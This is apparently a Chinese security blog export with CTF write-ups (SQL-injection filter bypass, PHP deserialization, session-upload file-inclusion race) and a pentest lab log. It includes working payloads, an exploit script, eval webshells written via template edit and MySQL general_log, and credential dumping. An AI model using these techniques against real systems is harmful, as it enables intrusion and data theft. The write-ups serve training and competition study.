<p>通过审计之后发现通过<code>if ($username !== 'admin')</code>限制了用户名为<code>admin</code>，同时输入的密码会进入<code>checkSql</code>这个函数里面，不难发现这个函数机型正则匹配，过滤了<code>/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i</code>，大小写都过滤了</p>
<blockquote>
<p><code>if (isset($_POST['username']) &amp;&amp; $_POST['username'] != '' &amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['password'] != '')同时在这里，对输入的密码和sql查询得密码进行了判断。</code></p>
</blockquote>
<p>过程就是判断用户名是否为admin-&gt;密码进行checkSql函数检测-&gt;用户名和密码带入数据库进行密码查询-&gt;查询后的值不能为空-&gt;查询后的值需要和你输入的值一样。</p>
<blockquote>
<p>介绍一下replace函数的作用。语法：replace(object,search,replace)、语义：把object对象中出现的的search全部替换成replace。实例：select replace(‘abc’,‘b’,‘123’)。最终结果为a123c</p>
</blockquote>
<p>这道题就是使用replace函数进行绕过，payload如下:</p>
<pre><code class="hljs plaintext">1&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#x27;)))#</code></pre>
<blockquote>
<p>这里使用了两次replace函数，把1’UNION(SELECT(REPLACE(REPLACE('1&quot;UNION(SELECT(REPLACE(REPLACE(“%”,CHAR(34),CHAR(39)),CHAR(37),“%”)))#看成整体更容易理解，这个就相当于先把“替换成‘，然后再把%替换成1’UNION(SELECT(REPLACE(REPLACE('1&quot;UNION(SELECT(REPLACE(REPLACE(“%”,CHAR(34),CHAR(39)),CHAR(37),“%”)))#</p>
</blockquote>
<p>经过这两次替换，得到的值就和2输出的值一样了。</p>
<pre><code class="hljs plaintext">ctfhub&#123;f80e6d849c2202aa2aa253ef&#125;</code></pre>
<h1 id="pklovecloud">pklovecloud</h1>
<ul>
<li>
<p>反序列化</p>
</li>
<li>
<p>__toString函数</p>
</li>
</ul>
<pre><code class="hljs plaintext">&lt;?php  
include &#x27;flag.php&#x27;;
class pkshow 
&#123;  
    function echo_name()     
    &#123;          
        return &quot;Pk very safe^.^&quot;;      
    &#125;  
&#125; 

class acp 
&#123;   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    &#123;      
        $this-&gt;cinder = new pkshow;
    &#125;  
    function __toString()      
    &#123;          
        if (isset($this-&gt;cinder))  
            return $this-&gt;cinder-&gt;echo_name();      
    &#125;  
&#125;  

class ace
&#123;    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    &#123;   
        $this-&gt;openstack = unserialize($this-&gt;docker);
        $this-&gt;openstack-&gt;neutron = $heat;
        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)
        &#123;
        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;
            if (file_get_contents($file))         
            &#123;              
                return file_get_contents($file); 
            &#125;  
            else 
            &#123; 
                return &quot;keystone lost~&quot;; 
            &#125;    
        &#125;
    &#125;  
&#125;  

if (isset($_GET[&#x27;pks&#x27;]))  
&#123;
    $logData = unserialize($_GET[&#x27;pks&#x27;]);
    echo $logData; 
&#125; 
else 
&#123; 
    highlight_file(__file__); 
&#125;
?&gt;</code></pre>
<p>一步一步分析一下，</p>
<pre><code class="hljs plaintext">include &#x27;flag.php&#x27;
这个说明该目录就是flag.php，只要想办法读取这个内容，就会得到flag。</code></pre>
<pre><code class="hljs plaintext">class pkshow 
&#123;  
    function echo_name()     
    &#123;          
        return &quot;Pk very safe^.^&quot;;      
    &#125;  
&#125; 
这个pkshow类，没有啥利用点，也看到了最后的返回值是Pk very safe^.^</code></pre>
<pre><code class="hljs plaintext">class acp 
&#123;   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    &#123;      
        $this-&gt;cinder = new pkshow;
    &#125;  
    function __toString()      
    &#123;          
        if (isset($this-&gt;cinder))  
            return $this-&gt;cinder-&gt;echo_name();      
    &#125;  
&#125;  
重点就在这个acp类，可以看到有两个魔法函数，_construct()和_toSring()，但是_construct()这个函数是用到了pkshow这个库，前面说了这个库没有用，所以重点就是_tostring这个库，通过这个函数可以进到ace函数里面，同时执行echo_name函数读取到flag内容。</code></pre>
<pre><code class="hljs plaintext">class ace
&#123;    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    &#123;   
        $this-&gt;openstack = unserialize($this-&gt;docker);
        $this-&gt;openstack-&gt;neutron = $heat;
        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)
        &#123;
        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;
            if (file_get_contents($file))         
            &#123;              
                return file_get_contents($file); 
            &#125;  
            else 
            &#123; 
                return &quot;keystone lost~&quot;; 
            &#125;    
        &#125;
    &#125;  
&#125;  
这个ace类，触发echo_name函数就会执行下面的程序，也就是读取到了flag.php
 $this-&gt;openstack = unserialize($this-&gt;docker);这个是反序列化docker的值并赋值给openstack
  if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)这个是进行判断两者是否相等
  相等就会执行 if (file_get_contents($file))         
            &#123;              
                return file_get_contents($file)
            &#125;  读取内容并返回值</code></pre>
<pre><code class="hljs plaintext">if (isset($_GET[&#x27;pks&#x27;]))  
&#123;
    $logData = unserialize($_GET[&#x27;pks&#x27;]);
    echo $logData; 
&#125; 
最后的这个是接收参数进行反序列化，并赋值给logdata，同时echo时就会触发类中的_tostring()</code></pre>
<p>下面就是构造payload，要求也就是上面分析的这些</p>
<ul>
<li>
<p>先是进入到acp类，修改cinder的值为ace</p>
</li>
<li>
<p>然后进入到ace类后，将docker的值反序列化后等于acp</p>
</li>
<li>
<p>docker的值反序列化后赋值给openstrack，也就是让openstrack等于acp，所以需要让acp类中的neutron和nova的值相等</p>
</li>
<li>
<p>最后保证filename的值等于flag.php</p>
</li>
</ul>
<pre><code class="hljs plaintext">if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)通过空返回染过这个判断，也就是让其null==null</code></pre>
<pre><code class="hljs plaintext">$this-&gt;openstack = unserialize($this-&gt;docker);当docker为空时，this-&gt;openstack自然为空对象，则$this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova两侧都为null自然可绕过。</code></pre>
<p>首先先测试一下</p>
<pre><code class="hljs plaintext">&lt;?php

$a=&quot;&quot;;
$b=unserialize($a);
var_dump($b);//bool(false)
var_dump($a-&gt;sss);//报异常并返回null
var_dump($a-&gt;ttt-&gt;xxx===null);//bool(true)
?&gt;</code></pre>
<p><img src="https://z4a.net/images/2022/06/02/image5a1ff1ed20b79246.png" alt="image5a1ff1ed20b79246.png"></p>
<p>构造exp</p>
<pre><code class="hljs plaintext">&lt;?php
class acp 
&#123;   
    public $cinder;  
    public $neutron;
    public $nova;
&#125;
class ace
&#123;    
    public $filename;     
    public $openstack;
    public $docker;
&#125;
$b=new acp;
$c=new ace;
$b-&gt;cinder=$c;
$c-&gt;docker=&#x27;&#x27;;
$c-&gt;filename=&#x27;/flag.php&#x27;;
echo urlencode(serialize($b));

?&gt;</code></pre>
<pre><code class="hljs plaintext">?pks=O%3A3%3A%22acp%22%3A3%3A%7Bs%3A6%3A%22cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A9%3A%22%2Fflag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A0%3A%22%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D</code></pre>
<p><img src="https://z4a.net/images/2022/06/02/image9c886f41229594dd.png" alt="image9c886f41229594dd.png"></p>
<pre><code class="hljs plaintext">
&lt;?php
// ctfhub&#123;1035800175138278d4dba43e&#125;;
$heat=&#x27;asdwe1g648798qwe321d65&#x27;;
?&gt;</code></pre>
<h2 id="php反序列化题型扩展">php反序列化题型扩展</h2>
<p>看这个题目</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">#error_reporting(0);</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;
        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;
        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);
    &#125;
&#125;
<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))
&#123;
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);
&#125;

@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);</code></pre>
<p>HelloPhp这个类用到了两个魔术函数,_construct()和_destruct()，在<code>__destruct</code>方法中,使用成员变量<code>$a</code>作为参数<code>$b</code>作为变量函数名执行代码，在代码最后接收GET参数并进行反序列化。</p>
<p>只需要通过构造<code>$a</code>与<code>$b</code>组成危险代码,然后构造HelloPhp类的序列化对象即可</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;system&#x27;</span>;
&#125;
<span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;   
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);
</code></pre>
<pre><code class="hljs php">O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;HelloPhp&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;</code></pre>
<h1 id="easycleanup">EasyCleanup</h1>
<ul>
<li>文件包含</li>
</ul>
<pre><code class="hljs plaintext">&lt;?php

if(!isset($_GET[&#x27;mode&#x27;]))&#123;
    highlight_file(__file__);
&#125;else if($_GET[&#x27;mode&#x27;] == &quot;eval&quot;)&#123;
    $shell = $_GET[&#x27;shell&#x27;] ?? &#x27;phpinfo();&#x27;;
    if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;);
    eval($shell);
&#125;


if(isset($_GET[&#x27;file&#x27;]))&#123;
    if(strlen($_GET[&#x27;file&#x27;]) &gt; 15 | filter($_GET[&#x27;file&#x27;])) exit(&quot;hacker&quot;);
    include $_GET[&#x27;file&#x27;];
&#125;


function filter($var): bool&#123;
    $banned = [&quot;while&quot;, &quot;for&quot;, &quot;\$_&quot;, &quot;include&quot;, &quot;env&quot;, &quot;require&quot;, &quot;?&quot;, &quot;:&quot;, &quot;^&quot;, &quot;+&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;, &quot;`&quot;];

    foreach($banned as $ban)&#123;
        if(strstr($var, $ban)) return True;
    &#125;

    return False;
&#125;

function checkNums($var): bool&#123;
    $alphanum = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;;
    $cnt = 0;
    for($i = 0; $i &lt; strlen($alphanum); $i++)&#123;
        for($j = 0; $j &lt; strlen($var); $j++)&#123;
            if($var[$j] == $alphanum[$i])&#123;
                $cnt += 1;
                if($cnt &gt; 8) return True;
            &#125;
        &#125;
    &#125;
    return False;
&#125;
?&gt;</code></pre>
<p>传个eval可以直接看到phpionfo<img src="https://z4a.net/images/2022/06/02/image85d1e6c8234890ca.png" alt="image85d1e6c8234890ca.png"></p>
<p>用个脚本就行，还有文件包含的方法有时间再试试</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> threading
host = <span class="hljs-string">&#x27;http://challenge-983911a7e85eadf8.sandbox.ctfhub.com:10800/&#x27;</span>
sessid = <span class="hljs-string">&#x27;aa&#x27;</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">session</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)
        session.post(
            host,
            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;cat flag_is_here_not_are_but_you_find&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,
            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;a.txt&#x27;</span>, f)&#125;,
            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,
        )
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)
        <span class="hljs-comment"># print(response.text)</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(response.text)
            <span class="hljs-keyword">break</span>
 
<span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:
    t1 = threading.Thread(target=POST, args=(session, ))
    t1.daemon = <span class="hljs-literal">True</span>
    t1.start()
    READ(session)</code></pre>
<p><img src="https://z4a.net/images/2022/06/02/image56affc20afdb8901.png" alt="image56affc20afdb8901.png"></p>
<p>得到flag</p>
<pre><code class="hljs plaintext">ctfhub&#123;b3e1bc40dcd3963ea50bed39&#125;</code></pre>
]]></content>
      <categories>
        <category>赛后复盘</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>红日靶场(一)</title>
    <url>/2023/03/07/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p>红日靶场1练习记录</p>
<span id="more"></span>
<blockquote>
<p>不是一次做完的，图片地址有所偏差</p>
</blockquote>
<p>外网打点</p>
<blockquote>
<p>外网192.168.206.129         内网192.168.52.143</p>
</blockquote>
<p>只知道一个IP，先用nmap进行扫描吧，看看开放端口，开放80和3306端口</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307111523371.png?x-oss-process=hzy" alt="image-20230307111523371"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307111604682.png?x-oss-process=hzy" alt="image-20230307111604682"></p>
<p>扫一下存活目录,得到一个baifen.rar,down下来瞅瞅，发现是一个yxcms的源码，不难猜测这这个80端口web服务应该就是yxcms，加了个路径发现猜想正确</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307103414662.png?x-oss-process=hzy" alt="image-20230307103414662"></p>
<p>一个PHP网站，路径和账密都给了，直接进后台探测</p>
<p>在模板界面插入一句话</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307104617678.png?x-oss-process=hzy" alt="image-20230307104617678"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307104627295.png?x-oss-process=hzy" alt="image-20230307104627295"></p>
<p>getshell之后上蚁剑</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307104943462.png?x-oss-process=hzy" alt="image-20230307104943462"></p>
<blockquote>
<p>169.254.129.156</p>
</blockquote>
<p>传入fscan进行内网扫描</p>
<pre><code class="hljs plaintext">start infoscan
(icmp) Target 169.254.129.186 is alive
[*] Icmp alive hosts len is: 1
169.254.129.186:3306 open
169.254.129.186:445 open
169.254.129.186:139 open
169.254.129.186:135 open
169.254.129.186:80 open
[*] alive ports len is: 5
start vulscan
[*] NetInfo:
[*]169.254.129.186
   [-&gt;]stu1
   [-&gt;]192.168.52.143
   [-&gt;]169.254.129.186
   [-&gt;]192.168.18.132
[+] 169.254.129.186   MS17-010	(Windows 7 Professional 7601 Service Pack 1)
[+] mysql:169.254.129.186:3306:root 123456
[*] NetBios: 169.254.129.186 stu1.god.org                        Windows 7 Professional 7601 Service Pack 1 
[*] WebTitle: http://169.254.129.186    code:200 len:14786  title:phpStudy 探针 2014</code></pre>
<p>发现169.254.129.186存在永恒之蓝</p>
<p>3306mysql弱密码 root 123456</p>
<p>这里不难发现存在域环境</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307110007024.png?x-oss-process=hzy" alt="image-20230307110007024"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307110020388.png?x-oss-process=hzy" alt="image-20230307110020388"></p>
<p>当前身份不是最高权限，考虑提权</p>
<p>考虑cs上线，tasklist未查询到杀软，所以不用免杀了，直接原生cs马即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307110424376.png?x-oss-process=hzy" alt="image-20230307110424376"></p>
<p>提权不行还是这个权限</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307113122746.png?x-oss-process=hzy" alt="image-20230307113122746"></p>
<p>不过刚才还有个mysql服务没有挖掘，可以看到路径</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307113211434.png?x-oss-process=hzy" alt="image-20230307113211434"></p>
<p>访问之后弱口令登陆进去了 root/root</p>
<p>进来之后优先考虑的就是提权，udf或者mof提权，但是secure_file_priv存在NULL，利用不了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307123352896.png?x-oss-process=hzy" alt="image-20230307123352896"></p>
<p>尝试能否通过数据库再建立一个webshell</p>
<blockquote>
<p>最常用的就是日志getshell</p>
</blockquote>
<p>mysql5.0以上可以写入日志</p>
<p>先查看日志读写权限，默认是OFF</p>
<pre><code class="hljs plaintext">show variables like &#x27;%general%&#x27;;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307130313922.png?x-oss-process=hzy" alt="image-20230307130313922"></p>
<p>打开general_log日志读写功能</p>
<pre><code class="hljs plaintext">SET GLOBAL general_log=&#x27;on&#x27;；</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307130529957.png?x-oss-process=hzy" alt="image-20230307130529957"></p>
<p>前面知道绝对路径为 C:/phpStudy/WWW</p>
<p>将日志写入指定文件</p>
<pre><code class="hljs plaintext">SET GLOBAL general_log_file=&#x27;C:/phpStudy/WWW/hzy.php&#x27;;</code></pre>
<p>写入一句话到这个文件</p>
<pre><code class="hljs plaintext">select &quot;&lt;?php eval($_POST[hzy]);?&gt;&quot;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307131349004.png?x-oss-process=hzy" alt="image-20230307131349004"></p>
<p>蚁剑连接之后查看权限还是上面那个，在域god.org内，还存在另一个网段169.254.129.0/24</p>
<p>使用neo进行内网代理</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307144940044.png?x-oss-process=hzy" alt="image-20230307144940044"></p>
<blockquote>
<p><strong>因为DNS主机是192.168.52.138，一般来说会把DNS服务器安装在域控DC上，所以我猜测192.168.52.138是DC</strong></p>
</blockquote>
<p>这里插一嘴，其实在上面cs上线的时候就进行抓取密码了，并且拿到了明文密码，且RDP开放，但是输入密码一直显示错误，我不理解</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307153110368.png?x-oss-process=hzy" alt="image-20230307153110368"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307153137700.png?x-oss-process=hzy" alt="image-20230307153137700"></p>
<p>最终捣鼓了一下，发现我看错用户名了，这波我的，最终改正确用户名，成功连接RDP</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307155954191.png?x-oss-process=hzy" alt="image-20230307155954191"></p>
<p>是否存在域的判断方法</p>
<pre><code class="hljs plaintext">1.whoami hostname  看两者是否一样
2.ipconfig /all 看DNS
3.systeminfo  看是否有域一栏</code></pre>
<p><img src="/2023/03/07/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/C:%5CUsers%5C25963%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230307153329479.png" alt="image-20230307153329479"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230307153411039.png?x-oss-process=hzy" alt="image-20230307153411039"></p>
<p>断定有域的,域渗透能力有待提高</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>第六届蓝帽杯初赛</title>
    <url>/2022/07/09/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/</url>
    <content><![CDATA[<p><img src="http://img.hzy2003628.top/202207092253814.png" alt="image-20220709225327592"></p>
<span id="more"></span>
<p>今天打了一天这个比赛，也是第一次接触取证题发现还可以接受,这个比赛拿了个稍微好点的成绩，但是身为web手两个web题都没写出来，说来有点惭愧，也进了半决赛,再接再厉吧</p>
<p><img src="http://img.hzy2003628.top/202207092255149.png" alt="image-20220709225526962"></p>
<h1 id="misc">misc</h1>
<h2 id="domainhacker">domainhacker</h2>
<p>流量导出数据压缩包</p>
<p><img src="http://img.hzy2003628.top/202207090908250.png" alt="image-20220709090851162"></p>
<p>解压需要密码，在这找到base64解码</p>
<p><img src="http://img.hzy2003628.top/202207090912798.png" alt="image-20220709091234727"></p>
<p><img src="http://img.hzy2003628.top/202207090913620.png" alt="image-20220709091342563"></p>
<p>解压密码为SecretsPassw0rds</p>
<p>然后分析得到flag</p>
<p><img src="http://img.hzy2003628.top/202207090914728.png" alt="image-20220709091415666"></p>
<p>flag{416f89c3a5deb1d398a1a1fce93862a7}</p>
<h2 id="domainhacker2">domainhacker2</h2>
<p>首先流量分析获得base64加密的压缩命令，从中可以得到解压密码</p>
<p><img src="http://img.hzy2003628.top/202207091345175.png" alt="image-20220709134500768"></p>
<p><img src="http://img.hzy2003628.top/202207091345427.png" alt="image-20220709134544370"></p>
<p>即解压密码是FakePassword123$，解压压缩包发现是注册表文件</p>
<p>用<a href="https://github.com/MichaelGrafnetter/DSInternals/releases/download/v4.7/DSInternals_v4.7.zip">DSInternals</a>将文件从 Active Directory 数据库中检索有关单个帐户的信息</p>
<pre><code class="hljs plaintext">$key = Get-BootKey -SystemHiveFilePath &#x27;C:\Users\25963\Desktop\new\Active Directory\SYSTEM&#x27;</code></pre>
<pre><code class="hljs plaintext">Get-ADDBAccount -ALL -DBPath &quot;C:\Users\25963\Desktop\new\Active Directory\ntds.dit&quot; -BootKey $key</code></pre>
<p><img src="http://img.hzy2003628.top/202207091348729.png" alt="image-20220709134823665"></p>
<p>得到flag为flag{07ab403ab740c1540c378b0f5aaa4087}</p>
<h1 id="电子取证">电子取证</h1>
<h2 id="手机取证_1">手机取证_1</h2>
<p>下载附件进去一把梭，直接搜索图片名得到图片</p>
<p><img src="http://img.hzy2003628.top/202207091027558.png" alt="image-20220709102729426"></p>
<p><img src="http://img.hzy2003628.top/202207091027158.png" alt="image-20220709102751110"></p>
<p>所以最终答案是360x360</p>
<h2 id="手机取证_2">手机取证_2</h2>
<p>搜素姜总得到关键信息</p>
<p><img src="http://img.hzy2003628.top/202207091044127.png" alt="image-20220709104451004"></p>
<p>所以结果是SF1142358694796</p>
<h2 id="程序分析_1">程序分析_1</h2>
<p>先把附件进行反编译</p>
<pre><code class="hljs plaintext">apktool.bat d EXE.apk</code></pre>
<p><img src="http://img.hzy2003628.top/202207091513477.png" alt="image-20220709151340386"></p>
<p>得到AndroidManifest.xml，发现程序包名<img src="http://img.hzy2003628.top/202207091514079.png" alt="image-20220709151440024"></p>
<p>即flag为exec.azj.kny.d.c</p>
<h2 id="程序取证_2">程序取证_2</h2>
<p>继第一题，第二题，第一个显示的activity就是在xml配置中的入口，查看得到如下</p>
<pre><code class="hljs plaintext">&lt;activity android:enabled=&quot;false&quot; android:label=&quot;@string/app_w_name&quot; android:name=&quot;minmtta.hemjcbm.ahibyws.MainActivity&quot; android:screenOrientation=&quot;portrait&quot;&gt;</code></pre>
<p><img src="http://img.hzy2003628.top/202207091542992.png" alt="image-20220709154200919"></p>
<p>即flag为minmtta.hemjcbm.ahibyws.MainActivity</p>
<h2 id="程序分析_3">程序分析_3</h2>
<p>首先进行反编译，审计源码得到关键代码</p>
<p><img src="http://img.hzy2003628.top/202207091626230.png" alt="image-20220709162612137"></p>
<p>分析后得服务器地址的密文就是aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</p>
<p>即flag</p>
<h2 id="计算机取证_1">计算机取证_1</h2>
<p>直接导出用户哈希，taqi7的hash值是7f21caca5685f10d9e849cc84c340528</p>
<pre><code class="hljs plaintext">volatility.exe -f 1.dmp --profile=Win7SP1x64 hashdump</code></pre>
<p><img src="http://img.hzy2003628.top/202207091650328.png" alt="image-20220709165019266"></p>
<p>解密得到开机密码<img src="http://img.hzy2003628.top/202207091652888.png" alt="image-20220709165245843"></p>
<p>所以flag为anxinqi</p>
<h2 id="计算机取证_2">计算机取证_2</h2>
<p>先获取内存操作系统</p>
<pre><code class="hljs plaintext">volatility -f 1.dmp imageinfo</code></pre>
<p><img src="http://img.hzy2003628.top/202207091208284.png" alt="image-20220709120844206"></p>
<p>内存网络扫描，进程列举，审计进程确定是MagnetRAMCaptu.exe</p>
<p><img src="http://img.hzy2003628.top/202207091206981.png" alt="image-20220709120636820"></p>
<p>即pid是2192</p>
<h2 id="计算机取证_3">计算机取证_3</h2>
<p>首先将1.dmp和G.E01放到Passware Kit Forensic 2021 v1 (64-bit)中进行解密并提取得到线索</p>
<p><img src="http://img.hzy2003628.top/202207091832563.png" alt="image-20220709183218465"></p>
<p>发现ppt和word文档都需要密码，爆破word文档密码得到为688561</p>
<p>pptx密码为287fuweiuhfiute</p>
<p><img src="http://img.hzy2003628.top/202207091834324.png" alt="image-20220709183405263"></p>
<p>输入发现只能只读模式打开，打开后得到flag</p>
<p><img src="http://img.hzy2003628.top/202207091834985.png" alt="image-20220709183418862"></p>
<p>flag{b27867b66866866686866883bb43536}</p>
<h2 id="网站取证_1">网站取证_1</h2>
<p>下载附件放D盾扫一下，得到assert后门一句话木马</p>
<p><img src="http://img.hzy2003628.top/202207091402806.png" alt="image-20220709140219719"></p>
<p>所以flag是lanmaobei666</p>
<h2 id="网站取证_2">网站取证_2</h2>
<p>www文件拉入vs审计，全局搜索password，经筛选发现database.php关键函数（pgsql数据库配置）</p>
<p><img src="http://img.hzy2003628.top/202207091554426.png" alt="image-20220709155407343"></p>
<p>跟随函数，发现加密的密码</p>
<p><img src="http://img.hzy2003628.top/202207091555027.png" alt="image-20220709155513940"></p>
<p>分析一下得到解密过程</p>
<p>密文先进行base64解密之后再进行AES解密，其中相关数据如下：</p>
<pre><code class="hljs plaintext">密文是$str = &#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;;
密钥是$key = &#x27;PanGuShi&#x27;;
